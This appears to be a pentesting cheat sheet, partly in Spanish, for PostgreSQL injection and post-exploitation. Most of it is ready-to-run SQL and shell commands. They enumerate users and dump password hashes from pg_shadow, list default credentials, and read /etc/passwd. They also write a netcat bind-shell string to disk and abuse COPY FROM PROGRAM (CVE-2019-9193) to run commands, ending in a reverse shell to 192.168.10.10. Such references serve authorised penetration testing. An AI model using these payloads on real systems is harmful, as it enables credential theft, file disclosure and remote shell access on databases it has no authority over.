# PostgreSQL Injection

# Indice


- [PostgreSQL version](#PostgreSQL-Version)
- [PostgreSQL Current User](#PostgreSQL-Current-User)
- [PostgreSQL List Users](#PostgreSQL-List-Users)
- [PostgreSQL List Password Hashes](#PostgreSQL-List-Password-Hashes)
- [PostgreSQL List Database Administrator Accounts](#PostgreSQL-List-Database-Administrator-Accounts)
- [PostgreSQL List Privileges](#PostgreSQL-List-Privileges)
- [PostgreSQL Check if Current User is Superuser](#PostgreSQL-Check-if-Current-User-is-Superuser)
- [PostgreSQL database name](#PostgreSQL-database-name)
- [PostgreSQL List databases](#PostgreSQL-List-databases)
- [PostgreSQL List tables](#PostgreSQL-List-tables)
- [PostgreSQL List columns](#PostgreSQL-List-columns)
- [Enumeraciones comunes en consola](#Enumeraciones-comunes-en-consola)
- [Lectura de archivos](#Lectura-de-archivos)
- [Escritura de archivos](#Escritura-de-archivos)
- [Ejecucion de comandos](#Ejecucion-de-comandos)
  - [CVE-2019–9193](#CVE-2019–9193)


# PostgreSQL Version

```sql
SELECT version()
```

# PostgreSQL Current User

```sql
SELECT user;
SELECT current_user;
SELECT session_user;
SELECT usename FROM pg_user;
SELECT getpgusername();
```

# PostgreSQL List Users

```sql
SELECT usename FROM pg_user
```

# PostgreSQL List Password Hashes

```sql
SELECT usename, passwd FROM pg_shadow 
```

# PostgreSQL List Database Administrator Accounts

```sql
SELECT usename FROM pg_user WHERE usesuper IS TRUE
```

# PostgreSQL List Privileges

```sql
SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user
```

# PostgreSQL Check if Current User is Superuser

```sql
SHOW is_superuser; 
SELECT current_setting('is_superuser');
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
```

# PostgreSQL Database Name

```sql
SELECT current_database()
```

# PostgreSQL List Database

```sql
SELECT datname FROM pg_database
```

# PostgreSQL List Tables

```sql
SELECT table_name FROM information_schema.tables
```

# PostgreSQL List Columns

```sql
SELECT column_name FROM information_schema.columns WHERE table_name='data_table'
```

# Enumeraciones comunes en consola

Acceso a consola

Credenciales por defecto: postgres:postgres

- psql
````sql
psql -U <user> -p <puerto> -h <ip>
psql -U postgres -p 5437 -h 192.168.10.10
````

Comandos
````sql
# Listar bases de datos
\l
# Usar una base de datos
\c <bd>

# Listar tablas
\dt

# Listar columnas
select * from <columna>;
````

# Lectura de archivos
````
select pg_ls_dir('/etc/passwd');
select pg_read_file('PG_VERSION', 0, 200);
````
![image](https://github.com/n3masyst/Pentesting/assets/133997401/27431aa0-266c-486f-bb8e-c4f9b875dbe5)

# Escritura de archivos
````
CREATE TABLE pentestlab (t TEXT);
INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash');
SELECT * FROM pentestlab;
COPY pentestlab(t) TO '/tmp/pentestlab';
````

# Ejecucion de comandos
## CVE-2019–9193
1. Eliminamos la tabla cmd_exec si existe
````
DROP TABLE IF EXISTS cmd_exec;
````
2. Creamos la tabla de nuevo donde se almacenara nuestro comando
````
CREATE TABLE cmd_exec(cmd_output text);
````
3. Ejecutamos el comando con COPY
````
COPY cmd_exec FROM PROGRAM '<comando>';
COPY cmd_exec FROM PROGRAM '<whoami>';
COPY cmd_exec FROM PROGRAM '<which netcat>';
COPY cmd_exec FROM PROGRAM 'nc -e /bin/sh 192.168.10.10 80';
````
4. Vemos el output
````
SELECT * FROM cmd_exec;
````

![image](https://github.com/n3masyst/Pentesting/assets/133997401/dff30501-e42b-4689-ba31-9a0e4bddf4b4)
